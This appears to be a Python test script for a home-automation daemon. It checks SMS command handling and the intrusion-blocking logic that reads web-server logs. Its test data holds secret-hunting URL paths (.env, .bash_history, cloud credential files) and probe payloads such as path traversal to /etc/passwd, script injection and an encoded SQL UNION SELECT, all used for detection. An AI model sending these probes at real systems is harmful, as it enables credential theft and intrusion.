if not d.rooms():
    d.save_rooms([{'id': 'rtest1', 'name': 'Zkusebna'}, {'id': 'rtest2', 'name': 'Druha'}])
_room = d.rooms()[0] if d.rooms() else None
assert _room is not None, 'the check needs a room to work on'
if _room is not None:
    _other = next((r for r in d.rooms() if r['id'] != _room['id']), None)
    _heat = d.heating_apply
    d.heating_apply = lambda *a, **k: None
    try:
        assert d.sms_system_do('%s eco' % _room['name'], 'a test'), 'a room could not be put on eco'
        d.save_sms_builtin(['room_level:%s' % _room['id']])
        assert d.sms_system_do('%s eco' % _room['name'], 'a test') is None, \
            'a room switched off still took an instruction'
        assert d.sms_system_do('%s' % _room['name'], 'a test'), \
            'switching one command off took the others with it'
        if _other is not None:
            assert d.sms_system_do('%s eco' % _other['name'], 'a test'), \
                'switching one room off took the other rooms with it'
        # ...and it is gone from the help that room gives
        _said = d.sms_system_do('help %s' % _room['name'], 'a test') or ''
        _offers = [x.strip() for x in _said.split('say:')[-1].split(',')]
        assert ('%s eco' % _room['name']) not in _offers, \
            'the help still offers what was switched off: %r' % _said
        assert ('%s eco 19' % _room['name']) in _offers, \
            'the help dropped a command that is still on: %r' % _said
        # a whole family off
        d.save_sms_builtin(['room_level'])
        assert d.sms_system_do('%s eco' % _room['name'], 'a test') is None, 'a family switched off still acted'
        if _other is not None:
            assert d.sms_system_do('%s eco' % _other['name'], 'a test') is None, \
                'a family switched off still acted for another room'
        assert d.sms_system_do('%s 21.5' % _room['name'], 'a test'), \
            'switching one family off took another family with it'
        d.save_sms_builtin([])
        assert d.sms_system_do('%s eco' % _room['name'], 'a test'), 'switching it back on did not bring it back'
    finally:
        d.heating_apply = _heat
        d.save_sms_builtin([])
    print('a built-in command can be switched off for one thing, or for everything it covers')


# Help has to be enough on its own: from a phone, with no dashboard, it must
# lead from "help" to the topics, from a topic to its commands and the things
# it covers, and from a thing to what may be said to that thing.
_said = d.sms_system_do('help', 'a test') or ''
assert 'help' in _said.lower(), 'help does not say how to ask for more: %r' % _said
for _topic in d.sms_system_topics():
    _out = d.sms_system_do('help %s' % _topic, 'a test') or ''
    assert _out and _topic.split()[0] in _out.lower(), \
        'help %s said nothing about it: %r' % (_topic, _out)
    assert len(_out) <= 300, 'help %s is %d characters - longer than one message' % (_topic, len(_out))
if _room is not None:
    _out = d.sms_system_do('help %s' % _room['name'], 'a test') or ''
    assert _room['name'] in _out and 'eco' in _out, \
        'the help for one room does not say what may be said to it: %r' % _out
    assert len(_out) <= 300, 'the help for one room is longer than one message'
_out = d.sms_system_do('help nothing-like-this', 'a test') or ''
assert 'Topics' in _out, 'an unknown word did not point back at the topics: %r' % _out
print('help leads from the topics to a topic to one thing, and every answer fits in one message')


# A command written on the SMS card always wins over a built-in one, and a
# number that may not give commands reaches neither.
_was_cmds = d.store.meta_json('sms_commands')
d.store.set_meta('sms_commands', json.dumps([
    {'id': 'own', 'phrase': 'status', 'reply': 'my own answer', 'enabled': True, 'target': ''}]))
try:
    _replies = []
    _was_reply = d.sms_reply
    d.sms_reply = lambda who, what, **k: _replies.append(what)
    zigmon.CONFIG['sms_reply'] = 1
    _was_allow = zigmon.CONFIG.get('sms_allow')
    zigmon.CONFIG['sms_allow'] = '+420111222333'
    d.sms_handle('+420111222333', 'status')
    assert _replies and 'my own answer' in _replies[-1], \
        'a command written on the card lost to the built-in one: %r' % _replies
    _replies[:] = []
    d.sms_handle('+420999888777', 'status')       # a number that may not give commands
    assert not [x for x in _replies if 'in' in x and 'heating' in x], \
        'a number that may not give commands reached a built-in command: %r' % _replies
finally:
    d.sms_reply = _was_reply
    zigmon.CONFIG['sms_allow'] = _was_allow
    d.store.set_meta('sms_commands', json.dumps(_was_cmds))
print('a command written on the card beats a built-in one, and an unallowed number reaches neither')


# A command written on the SMS card answers first, so a built-in one with the
# same words never runs - and the card has to say so, for the family and for
# each thing, and put it back by itself when the house's own command goes.
_was_cmds = d.store.meta_json('sms_commands')
try:
    d.store.set_meta('sms_commands', json.dumps([]))
    assert not [r for r in d.sms_system_rows() if r['overridden_by']], \
        'with no commands of its own, something was said to be taken'
    # an own "ban" that ignores the address gives way to the built-in one,
    # which understands "ban ADDRESS" whole - it takes nothing
    d.store.set_meta('sms_commands', json.dumps([
        {'id': 'b', 'phrase': 'ban', 'enabled': True, 'target': ''}]))
    assert {r['key']: r for r in d.sms_system_rows()}['ban']['overridden_by'] is None, \
        'an own "ban" that ignores the address was said to take the built-in one'
    # one that does something with the address is sure of the message, and takes it
    d.store.set_meta('sms_commands', json.dumps([
        {'id': 'b', 'phrase': 'ban', 'enabled': True, 'target': '',
         'vars': [{'name': 'ip', 'from': '', 'note': ''}]},
        {'id': 'r', 'phrase': '%s eco' % _room['name'], 'enabled': True, 'target': ''}]))
    _by = {r['key']: r for r in d.sms_system_rows()}
    assert _by['ban']['overridden_by'] == 'ban', 'a built-in "ban" was not said to be taken'
    assert _by['unban']['overridden_by'] is None, '"unban" was taken by a command that says "ban"'
    _lvl = {m['id']: m['overridden_by'] for m in _by['room_level']['members']}
    assert _lvl[_room['id']], 'one room’s own command was not seen on that room'
    assert _by['room_level']['overridden_by'] is None, 'one room’s command took the whole family'
    assert not [k for k, v in _lvl.items() if v and k != _room['id']], 'it took the other rooms too'
    # ...and it is so: the house's own command is the one that answers
    assert d.sms_caught_by('ban 185.36.81.23') == 'ban'
    # a disabled command of your own takes nothing
    d.store.set_meta('sms_commands', json.dumps([
        {'id': 'b', 'phrase': 'ban', 'enabled': False, 'target': ''}]))
    assert {r['key']: r for r in d.sms_system_rows()}['ban']['overridden_by'] is None, \
        'a command switched off still took the built-in one'
    # gone, and the built-in one is back with the switch it had
    d.store.set_meta('sms_commands', json.dumps([]))
    assert {r['key']: r for r in d.sms_system_rows()}['ban']['overridden_by'] is None
finally:
    d.store.set_meta('sms_commands', json.dumps(_was_cmds))
print('a built-in command your own command takes over says so, and comes back when yours goes')



# An own SMS command and a built-in one, when both could take a message. The
# matching was loose: a phrase was the start of the message even inside a
# word ("off" answered "offline", "status" answered "statusbar"), and a word
# anywhere in a message was enough. So an own "off" that runs a scene took
# "heating off" and "Plug-UPS off" too, and ran that scene instead.
#   - the start of a message has to be whole words
#   - an own command sure of the message (all of it, or it uses the rest)
#     always answers; one that only found its word in a longer message gives
#     way to a built-in command that understands the message whole
_m = zigmon.Daemon.phrase_match
for _phrase, _text_, _want in (('off', 'off', True), ('off', 'Off', True), ('off', 'offline', False),
                               ('status', 'statusbar', False), ('sms', 'SMS-Gateway', False),
                               ('off', 'heating off', True), ('lights off', 'lights off now', True),
                               ('lights off', 'lights offline', False)):
    assert (_m(_phrase, _text_) is not None) == _want, \
        '"%s" against "%s" should %smatch' % (_phrase, _text_, '' if _want else 'not ')
_own = [
    {'id': 'o', 'phrase': 'off', 'target': 'scene:none', 'do': 'on', 'enabled': True},
    {'id': 'a', 'phrase': 'away', 'target': '', 'do': 'on', 'enabled': True, 'reply': 'Falco is away.'},
    {'id': 'b', 'phrase': 'ban', 'target': '', 'do': 'on', 'enabled': True,
     'vars': [{'name': 'myip', 'from': '', 'note': ''}], 'reply': 'Banned {myip}'},
]
assert d.sms_match_strength(_own[0], 'off') == 'strong'
assert d.sms_match_strength(_own[0], 'heating off') == 'weak'
assert d.sms_match_strength(_own[1], 'away 16') == 'weak', 'a command that ignores the rest was sure of it'
assert d.sms_match_strength(_own[2], 'ban 1.2.3.4') == 'strong', 'a command that uses the rest was not sure of it'
assert d.sms_match_strength(_own[0], 'offline') is None
_was_cmds = d.store.meta_json('sms_commands')
_heat_was = d.heating_apply
d.heating_apply = lambda *a, **k: None
_was_reply, _was_fire = d.sms_reply, d._fire_target
try:
    d.store.set_meta('sms_commands', json.dumps(_own))
    _said, _fired = [], []
    d.sms_reply = lambda who, what, **k: _said.append(what)
    d._fire_target = lambda *a, **k: _fired.append('scene:none' if 'none' in str(a[0]) else str(a[0]))
    zigmon.CONFIG.update({'sms_reply': 1, 'sms_allow': '+420111222333'})

    def _send(t):
        del _said[:]
        del _fired[:]
        d.sms_handle('+420111222333', t)
        return list(_said), list(_fired)
    _s, _f = _send('off')
    assert _f == ['scene:none'], 'an own "off" did not answer "off": %r' % (_f,)
    _s, _f = _send('heating off')
    assert 'scene:none' not in _f and _s and 'heating is off' in _s[-1], \
        'an own "off" took "heating off": %r %r' % (_s, _f)
    _send('heating on')
    _s, _f = _send('away 16')
    assert _s and 'away is worth 16' in _s[-1], 'an own "away" took "away 16": %r' % (_s,)
    _s, _f = _send('away')
    assert _s and 'Falco is away' in _s[-1], 'an own "away" did not answer "away": %r' % (_s,)
    _s, _f = _send('ban 185.36.81.23')
    assert _s and 'Banned 185.36.81.23' in _s[-1], 'an own "ban" with a name lost to the built-in: %r' % (_s,)
    # nothing understands it whole: the own command that found its word
    # answers, as it always did
    _s, _f = _send('turn everything off please')
    assert _f == ['scene:none'], 'a message only an own command understands went unanswered: %r' % (_f,)
    # the card says the same: only what an own command really takes
    _taken = {r['key'] for r in d.sms_system_rows() if r['overridden_by']}
    assert 'ban' in _taken, 'an own "ban" that uses the rest was not shown taking the built-in one'
    assert not (_taken & {'heat_onoff', 'heat_away', 'heat_away_c', 'plug_switch'}), \
        'the card says an own one-word command takes what it gives way to: %r' % _taken
finally:
    d.sms_reply = _was_reply
    d._fire_target = _was_fire
    d.heating_apply = _heat_was
    d.store.set_meta('sms_commands', json.dumps(_was_cmds))
print('an own command sure of a message answers it; one that only found its word gives way to a built-in one')


# ---------------------------------------------------------------------------
# What the front server's logs of 15-21 September 2026 taught (4.85.0).
# Every line below is a real one out of those logs, with the moment moved to
# now. Replayed in order through the real counting, the old rules left ten
# addresses that had done unmistakable things, and one that walked through
# twenty-one other people's sites via this server, never kept out.
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'block_sensitivity': 'normal',
                      'never_block': '', 'block_ladder': '', 'block_private': 'never',
                      'proxy_full_watch': 1, 'proxy_full_log': '/nonexistent-full.log'})
_stamp = lambda s: time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime(s))
_now = time.time()
_kept = lambda ip: ip in [r['ip'] for r in d.blocked_list()]


def _fresh():
    d.store.unblock()
    d.forget_anomaly()


# the paths that came back as "a page that is not there" and weighed 2 apiece
for _p in ('/litellm.yaml', '/litellm_config.yml', '/openai-proxy/config.json', '/openai-proxy.yaml',
           '/bedrock/config.yaml', '/anthropic/config.json', '/ai/credentials', '/llm/config.yml',
           '/config/bedrock.yaml', '/terraform.tfstate.backup', '/terraform.tfvars.json', '/main.tf',
           '/serverless.yml', '/cloudformation.json', '/samconfig.toml', '/.ebextensions/',
           '/buildspec.yml', '/cdk.json', '/.bash_history', '/user_secrets.yml', '/_vti_pvt/service.pwd',
           '/storage/logs/laravel.log', '/server-status.php', '/config.dev.php'):
    assert d._after_secrets(_p), 'a hunt for keys went unrecognised: %s' % _p
for _p in ('/js/twint_ch.js', '/js/raif_ch.js', '/js/antibot-client.js', '/bot-connect.js',
           '/static/style/protect/index.js', '/wp-admin/setup-config.php', '/admin/config.php',
           '/RDWeb/Pages/en-US/login.aspx'):
    assert d._known_way_in(_p), 'a known way in went unrecognised: %s' % _p
# ...and nothing this house itself asks for, nor what a browser or an AI
# crawler asks for without being told to
for _p in ('/', '/tap', '/api/tap', '/index.php', '/zigmon-api.php', '/favicon.svg', '/flags/cz.svg',
           '/api/status', '/api/wait', '/zigmon/json', '/zigmon-house/json', '/robots.txt',
           '/.well-known/mcp', '/.well-known/agent.json', '/ai/site-profile.json', '/sitemap.xml',
           '/config.js', '/sw.js', '/manifest.json', '/v1/health', '/login', '/template.yaml'):
    assert not (d._after_secrets(_p) or d._known_way_in(_p)), 'an ordinary path was taken for an attack: %s' % _p

# .env on one day and again three days later: one address, one intent
_fresh()
d.proxy_weigh(['129.159.56.14 - - [%s] "GET /.env HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; '
               'Win64; x64) AppleWebKit/537.36"' % _stamp(_now - 3 * 86400 - 3600)])
assert not _kept('129.159.56.14'), 'one request for .env was a block'
d.full_weigh([json.dumps({'ip': '129.159.56.14', 't': time.strftime('%Y-%m-%dT%H:%M:%S', time.localtime(_now - 30))
                          + '+02:00', 'm': 'GET', 'u': '/.env', 's': 404, 'host': 'ntfy.example.net',
                          'ua': 'Mozilla/5.0', 'auth': 'none', 'secret': 'none', 'which': 'ntfy'})])
assert _kept('129.159.56.14'), 'asking for .env again three days later was forgotten'
# ...but not for longer than a week
_fresh()
d.proxy_weigh(['129.159.56.15 - - [%s] "GET /.env HTTP/1.1" 404 146 "-" "x"' % _stamp(_now - 8 * 86400)])
d.proxy_weigh(['129.159.56.15 - - [%s] "GET /.env HTTP/1.1" 404 146 "-" "x"' % _stamp(_now - 30)])
assert not _kept('129.159.56.15'), 'a request for .env eight days ago was still held against an address'

# two neighbours, one tool, two seconds apart
_fresh()
d.proxy_weigh(['216.73.160.56 - - [%s] "GET /wp-login.php HTTP/1.1" 444 0 "-" "Mozilla/5.0 (Windows NT 10.0; '
               'Win64; rv:143.0) Gecko/20100101 Firefox/143.0"' % _stamp(_now - 12)])
assert not _kept('216.73.160.56'), 'the first of two neighbours was kept out for one request'
d.proxy_weigh(['216.73.160.204 - - [%s] "GET /wp-login.php HTTP/1.1" 444 0 "-" "Mozilla/5.0 (Windows NT 10.0; '
               'Win64; rv:143.0) Gecko/20100101 Firefox/143.0"' % _stamp(_now - 10)])
assert _kept('216.73.160.204'), 'the same break-in from the address next door two seconds later was not counted'
_row = next(r for r in d.blocked_list() if r['ip'] == '216.73.160.204')
assert 'next door' in str(_row.get('why') or ''), 'the block did not say what it counted: %r' % _row
# ...and only next door: the same thing from another network is two things
_fresh()
d.proxy_weigh(['47.88.94.28 - - [%s] "GET /Public/home/js/check.js HTTP/1.1" 444 0 "-" "x"' % _stamp(_now - 12)])
d.proxy_weigh(['47.251.15.21 - - [%s] "GET /static/admin/javascript/hetong.js HTTP/1.1" 444 0 "-" "x"'
               % _stamp(_now - 6)])
assert not _kept('47.88.94.28') and not _kept('47.251.15.21'), 'addresses in different networks were counted together'
# ...and a light thing next door is not the same thing
_fresh()
d.proxy_weigh(['216.73.161.56 - - [%s] "GET /wp-login.php HTTP/1.1" 444 0 "-" "x"' % _stamp(_now - 12)])
d.proxy_weigh(['216.73.161.204 - - [%s] "GET /.env HTTP/1.1" 404 0 "-" "x"' % _stamp(_now - 10)])
assert not _kept('216.73.161.204'), 'a different kind of thing next door was counted as the same tool'

# a round done slowly: other people's sites asked for through this server,
# one an hour, never twice inside the window
_fresh()
# (5.3) the walker of this guard wore its own name - "reverse-proxies-
# measurements" - and a tool that says what it is now ends sooner, by another
# rule. So the slow round is shown here as what it is meant to catch: a
# browser's own words, one light thing an hour, twelve in a day.
_walk = ['185.73.23.162 - - [%s] "GET / HTTP/1.1" 444 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
         'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"' % _stamp(_now - 23 * 3600 + i * 3000)
         for i in range(13)]
d.proxy_weigh(_walk[:11])
assert not _kept('185.73.23.162'), 'eleven light things in a day were a block'
d.proxy_weigh(_walk[11:])
assert _kept('185.73.23.162'), 'a dozen other people\'s sites asked for in a day, slowly, was never kept out'
# ...and the same round from a tool that names itself is over by the third
_fresh()
_named = ['185.73.23.163 - - [%s] "GET / HTTP/1.1" 444 0 "-" "Software Security Research/1.0 '
          '(+https://reverse-proxies-measurements.softsec.ruhr-uni-bochum.de)"' % _stamp(_now - 23 * 3600 + i * 3000)
          for i in range(4)]
d.proxy_weigh(_named[:2])
assert not _kept('185.73.23.163'), 'one visit from a named tool was a block'
d.proxy_weigh(_named[2:])
assert _kept('185.73.23.163'), 'a tool that says its own name walked the whole day unstopped'
# ...while a phone whose shortcut is refused all day is still a phone
_fresh()
d.proxy_weigh(['89.24.57.142 - - [%s] "POST /tap HTTP/2.0" 403 146 "-" "BackgroundShortcutRunner/4711 '
               'CFNetwork/3860.700.2 Darwin/25.6.0"' % _stamp(_now - 23 * 3600 + i * 2400) for i in range(30)])
assert not _kept('89.24.57.142'), 'a phone refused all day was kept out as a slow round'
# ...and the busiest address in those logs that was never kept out, five
# visits to the front page in a day, stays out of it
_fresh()
d.proxy_weigh(['212.156.70.154 - - [%s] "GET / HTTP/1.1" 444 0 "-" "Mozilla/5.0"' % _stamp(_now - 20 * 3600 + i * 3600)
               for i in range(5)])
assert not _kept('212.156.70.154'), 'five visits to the front page in a day were a block'

# TruffleHog, checking names and passwords it found published next to this
# server's address: seven in one second, every one refused
_fresh()
_told = []
_was_notify = d.notify
d.notify = lambda words, level='info', **k: _told.append((words, level, k.get('title'), k.get('dedup')))
try:
    _th_line = lambda n: json.dumps({'ip': '3.91.209.16', 't': time.strftime('%Y-%m-%dT%H:%M:%S',
                                     time.localtime(_now - 20)) + '+02:00', 'm': 'GET', 'u': '/zigmon',
                                     'proto': 'HTTP/1.1', 's': 401, 'host': 'ntfy.example.net', 'ua': 'TruffleHog',
                                     'secret': 'sent', 'auth': 'sent', 'reqlen': 130 + n, 'which': 'ntfy'})
    d.full_weigh([_th_line(n) for n in range(7)])
    assert _kept('3.91.209.16'), 'a credential checker trying seven names was not kept out'
    _mine = [t for t in _told if t[2] == 'Credentials for this server are published somewhere']
    assert len(_mine) == 1 and _mine[0][1] == 'warn' and 'none of them worked' in _mine[0][0], \
        'the house was not told, once, that its credentials are published somewhere: %r' % _told
    assert 'ntfy.example.net' in _mine[0][0], 'which server it was about went unsaid'
    # one that worked is worse news, and said as such
    del _told[:]
    d.full_weigh([json.dumps(dict(json.loads(_th_line(0)), ip='3.91.209.17', s=200))])
    _mine = [t for t in _told if t[2] == 'Credentials for this server are published somewhere']
    assert _mine and _mine[-1][1] == 'crit' and 'WORKED' in _mine[-1][0], \
        'a published credential that still works was not said loudly: %r' % _told
    # the plain access log says it too, when the full log is not read
    _fresh()
    zigmon.CONFIG.update({'proxy_full_watch': 0})
    d.proxy_weigh(['3.91.209.18 - - [%s] "GET /zigmon HTTP/1.1" 401 0 "-" "TruffleHog"' % _stamp(_now - 5)] * 2)
    assert _kept('3.91.209.18'), 'the access log did not recognise the credential checker'
    zigmon.CONFIG.update({'proxy_full_watch': 1})
finally:
    d.notify = _was_notify
_fresh()
print('the logs of 15-21 September: keys to AI and cloud, phishing kits, a week\'s memory, '
      'neighbours, slow rounds and a credential checker are all counted')


# snort.org: "You have exceeded 5 requests to the blocklist in under one
# minute. Please slow down." - and a Retry-After a whole day long. One fetch
# with the terms in the way is four requests, so a second press of the
# button inside that minute was the fifth.
import http.server as _hs2, threading as _th2


class _Strict(_hs2.BaseHTTPRequestHandler):
    seen = []
    def log_message(self, *a): pass
    def _send(self, code, body, kind='text/plain', extra=None):
        self.send_response(code)
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.send_header('Content-Type', kind)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def _count(self):
        _Strict.seen.append(time.time())
        return len([t for t in _Strict.seen if time.time() - t < 60]) > 5
    def do_GET(self):
        if self._count():
            return self._send(429, b'You have exceeded 5 requests to the blocklist in under one minute.',
                              extra={'Retry-After': '86400'})
        if self.path.endswith('/terms'):
            return self._send(200, (_TERMS % _FORM).encode(), 'text/html')
        if 'session=agreed' not in (self.headers.get('Cookie') or ''):
            return self._send(200, (_TERMS % '<p>accept first</p>').encode(), 'text/html')
        return self._send(200, _LIST.encode())
    def do_POST(self):
        self.rfile.read(int(self.headers.get('Content-Length') or 0))
        if self._count():
            return self._send(429, b'slow down', extra={'Retry-After': '86400'})
        self._send(200, (_TERMS % '<p>thank you</p>').encode(), 'text/html',
                   extra={'Set-Cookie': 'session=agreed; Path=/; Max-Age=31536000'})


_ssrv = _hs2.HTTPServer(('127.0.0.1', 0), _Strict)
_th2.Thread(target=_ssrv.serve_forever, daemon=True).start()
_surl = 'http://127.0.0.1:%d/downloads/ip-block-list' % _ssrv.server_address[1]
_was_strict = (zigmon.Daemon.FEEDS, dict(zigmon.CONFIG), d.SNORT_TERMS)
zigmon.Daemon.FEEDS = tuple((f[0], f[1], f[2], _surl if f[0] == 'talos' else f[3]) for f in zigmon.Daemon.FEEDS)
try:
    zigmon.CONFIG.update({'feeds': 'talos', 'feed_talos_url': '', 'feed_talos_accept': 1})
    d.SNORT_TERMS = _surl + '/terms'
    for _k in ('snort_cookies', 'feed_etag_talos', 'feed_modified_talos', 'feed_wait_talos', 'feed_error_talos',
               'snort_asked', 'snort_tried_at'):
        d.store.set_meta(_k, '')
    d.store.put_feed('talos', [])
    # the whole way, terms and all, in one fetch: four requests, and the list
    _got, _words = d.feed_fetch('talos')
    assert _got == 3, 'the list did not come the whole way in one fetch: %s' % _words
    assert len(_Strict.seen) <= 4, 'one fetch sent %d requests' % len(_Strict.seen)
    # the button pressed again at once, and again: nothing is sent, and the
    # day-long wait is not earned
    for _ in range(3):
        _got, _words = d.feed_fetch('talos')
        assert not _got and 'once every 10 minutes' in _words, _words
    assert len(_Strict.seen) <= 4, 'pressing the button again sent more: %d requests' % len(_Strict.seen)
    assert not d.store.get_meta('feed_wait_talos'), 'snort.org was asked often enough to be told to wait'
    # and however it is asked - after a restart, another thread - no more than
    # four go out inside a minute: the count is kept in the database
    d.store.set_meta('snort_tried_at', '0')
    d.store.set_meta('snort_cookies', '')
    _before = len(_Strict.seen)
    _got, _words = d.feed_fetch('talos')
    assert not _got and 'held back' in _words, 'a fifth request inside a minute went out: %s' % _words
    assert len(_Strict.seen) == _before, 'a request went out past the count'
    assert not d.store.get_meta('feed_wait_talos'), 'the limit was reached anyway'
finally:
    zigmon.Daemon.FEEDS = _was_strict[0]
    zigmon.CONFIG.clear(); zigmon.CONFIG.update(_was_strict[1])
    d.SNORT_TERMS = _was_strict[2]
    _ssrv.shutdown()
    d.store.put_feed('talos', [])
    for _k in ('snort_cookies', 'feed_etag_talos', 'feed_modified_talos', 'feed_wait_talos', 'feed_error_talos',
               'snort_asked', 'snort_tried_at'):
        d.store.set_meta(_k, '')
print('snort.org is sent at most four requests a minute and one fetch every ten minutes, however it is asked')


# ---------------------------------------------------------------------------
# (4.94) a list that did not download says which list it was, where it was
# asked for, how many times in a row, and when it is tried again - and the
# address it shows carries no user, password or key
_was_feeds, _was_talos_url = zigmon.CONFIG.get('feeds'), zigmon.CONFIG.get('feed_talos_url')
_was_inner = d._feed_fetch
try:
    zigmon.CONFIG['feeds'] = 'spamhaus,talos'
    for _k in ('feed_error_spamhaus', 'feed_error_talos', 'feed_wait_spamhaus', 'snort_tried_at'):
        d.store.set_meta(_k, '')
    d._feed_fetch = lambda which, url: (0, 'could not fetch it: HTTP 403 Forbidden')
    d.feed_fetch('spamhaus')
    _first = d._feed_error('spamhaus')
    assert _first['times'] == 1 and _first['url'] == 'https://www.spamhaus.org/drop/drop.txt', _first
    d.feed_fetch('spamhaus')
    _e = d.feed_errors()['spamhaus']
    assert _e['times'] == 2 and _e['since'] <= _e['at'] and _e['short'] == 'Spamhaus DROP' and _e['on'], _e
    assert abs(_e['next'] - (_e['at'] + 3600)) <= 1, 'when it is tried again is not said: %r' % _e
    zigmon.CONFIG['feed_talos_url'] = 'https://someone:hunter2@lists.example.org/talos.txt?key=SECRETKEY'
    d.store.set_meta('snort_tried_at', '0')
    d.feed_fetch('talos')
    _t = d.feed_errors()['talos']
    assert 'hunter2' not in json.dumps(_t) and 'SECRETKEY' not in json.dumps(_t) and 'someone' not in json.dumps(_t), _t
    assert _t['url'].startswith('https://lists.example.org/talos.txt'), _t
    zigmon.CONFIG['feeds'] = 'talos'
    assert d.feed_errors()['spamhaus']['on'] is False and d.feed_errors()['spamhaus']['next'] is None
    assert 'spamhaus' in d.status()['feeds']['errors'], 'the status does not carry the failures'
    d._feed_fetch = lambda which, url: (12, '12 range(s)')
    d.feed_fetch('talos')
    assert 'talos' not in d.feed_errors(), 'a list that came is still said to have failed'
finally:
    d._feed_fetch = _was_inner
    zigmon.CONFIG['feeds'], zigmon.CONFIG['feed_talos_url'] = _was_feeds, _was_talos_url
    for _k in ('feed_error_spamhaus', 'feed_error_talos', 'snort_tried_at'):
        d.store.set_meta(_k, '')
    d.store.put_feed('talos', [])
print('a list that did not download says which it was, where it asked, how often, and when it tries again')

# ============================================================================
# 5.3: what a week of the front server's own logs (17-26 September 2026) said
# ============================================================================
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'proxy_host': 'p',
                      'proxy_log': '/var/log/nginx/zigmon-tap.log', 'never_block': ''})
d.store.unblock()
d.forget_anomaly()

# -- the same request over and over is the signal, whatever it asks for ---------
# 213.209.159.154 asked for "/" fifty-eight times in five seconds and was never
# kept out: every one of them was "the same thing again within a breath", and
# so all fifty-eight counted as one.
_now2 = time.time()
_when2 = lambda back: time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime(_now2 - back))
_burst = ['213.209.159.154 - - [%s] "GET / HTTP/1.1" 444 0 "-" "Mozilla/5.0"' % _when2(300 - (_i // 12))
          for _i in range(58)]
_weighed = d.proxy_weigh(_burst)
_kinds = [c for c in d.anomaly_state() if c['ip'] == '213.209.159.154']
assert '213.209.159.154' in [r['ip'] for r in d.blocked_list()], \
    'fifty-eight requests in five seconds did not keep anybody out'
_when = next((i for i, _l in enumerate(_burst)
              if d.store.blocked_until('213.209.159.154')), None)
print('a burst: fifty-eight requests for one page in five seconds ends on the list')
d.store.unblock(); d.forget_anomaly()
# ...and a handful in the same breath is not a burst: a browser opening a page
_few = ['91.2.3.4 - - [%s] "GET /%s HTTP/1.1" 404 0 "-" "Mozilla/5.0"' % (_when2(200), _p)
        for _p in ('', 'favicon.ico', 'robots.txt', 'apple-touch-icon.png')]
d.proxy_weigh(_few)
assert '91.2.3.4' not in [r['ip'] for r in d.blocked_list()], 'a browser opening a page was kept out'
d.store.unblock(); d.forget_anomaly()

# -- a tool that says what it is -------------------------------------------------
# zgrab asked 227 times over the week, Odin 51, Censys 23, leakix 21 - each
# visit too small on its own to count, and not one of them was ever kept out.
_tools = ['198.211.105.15 - - [%s] "GET / HTTP/1.1" 444 0 "-" "Mozilla/5.0 zgrab/0.x"' % _when2(300 - _i * 30)
          for _i in range(3)]
_weighed = d.proxy_weigh(_tools)
assert _weighed.get('198.211.105.15') == 3, 'a scanner that says its own name was passed over: %r' % _weighed
assert any(k['kind'] == 'proxy-scanner' for c in d.anomaly_state()
           if c['ip'] == '198.211.105.15' for k in c.get('kinds') or []), \
    'it was not written down as a scanning tool: %r' % d.anomaly_state()
assert '198.211.105.15' in [r['ip'] for r in d.blocked_list()], \
    'three visits from a named scanner did not keep it out'
d.store.unblock(); d.forget_anomaly()
# the house's own, and the search engines, are not scanners
for _ua in ('ntfy/1.7.0 (build 9; iOS 27.0.0)', 'BackgroundShortcutRunner/5037.109',
            'Python-urllib/3.9', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'):
    assert not zigmon.Daemon._scanning_tool(_ua), '%r was taken for a scanning tool' % _ua
for _ua in ('Mozilla/5.0 zgrab/0.x', 'masscan/1.3', 'Nuclei - Open-source project',
            'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
            'Software Security Research/1.0 (+https://reverse-proxies-measurements.net)'):
    assert zigmon.Daemon._scanning_tool(_ua), '%r was not taken for a scanning tool' % _ua
print('a tool that names itself is weighed as one; the house and the search engines are not')
d.store.unblock(); d.forget_anomaly()

# -- what the week's paths asked for, and no list knew ---------------------------
for _path in ('/.passwd-s3fs', '/falco81.net_db.sql', '/falco81.net.sql', '/application.properties',
              '/application.yml', '/config.json', '/config.php', '/api/config',
              '/anthropic/config.json', '/openai-proxy/config.json', '/info.php.bak', '/.my.cnf'):
    assert zigmon.Daemon._after_secrets(_path), '%s is not read as asking for this machine\'s keys' % _path
for _path in ('/+CSCOU+/csco_logo.gif', '/auth_portal/Default/logo.gif', '/fonts/ftnt-icons.woff',
              '/query?q=SHOW+DIAGNOSTICS', '/dana-na/auth/url_default/welcome.cgi',
              '/global-protect/login.esp', '/wp-json/gravitysmtp/v1/tests/mock-data'):
    assert zigmon.Daemon._known_way_in(_path), '%s is not read as a published break-in' % _path
# the same probe written twice, once plainly and once percent-encoded
for _path in ('/?parameter=<script>alert(1)</script>', '/?parameter=%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
              '/?parameter=cmd.exe', '/?parameter=../../../etc/passwd',
              '/?q=%75%6e%69%6f%6e%20%73%65%6c%65%63%74%201'):
    assert zigmon.Daemon._climbing(_path), '%s is not read as a payload' % _path
# and nothing of the house's own is
for _path in ('/tap', '/zigmon-house', '/zigmon-house/json?poll=1&id=6rRxSUPTKAj', '/robots.txt',
              '/favicon.ico', '/manifest.webmanifest', '/config.js'):
    assert not (zigmon.Daemon._after_secrets(_path) or zigmon.Daemon._known_way_in(_path)
                or zigmon.Daemon._climbing(_path)), '%s was taken for a probe' % _path
print('the week\'s new probes are read: a password file, a database dump, an appliance, an encoded payload')

# -- a word that is not an HTTP method at all ------------------------------------
_odd = ['8.211.30.254 - - [%s] "ASDE / HTTP/1.1" 400 0 "-" "-"' % _when2(120)]
_weighed = d.proxy_weigh(_odd)
assert _weighed.get('8.211.30.254'), 'a method that is not a method was passed over'
assert any(k['kind'] == 'proxy-odd-method' for c in d.anomaly_state()
           if c['ip'] == '8.211.30.254' for k in c.get('kinds') or []), \
    'it was not written down as an odd method'
print('a word that is not an HTTP method is weighed as the nonsense it is')
d.store.unblock(); d.forget_anomaly()

# -- somebody who pressed a link and was let in is the house ---------------------
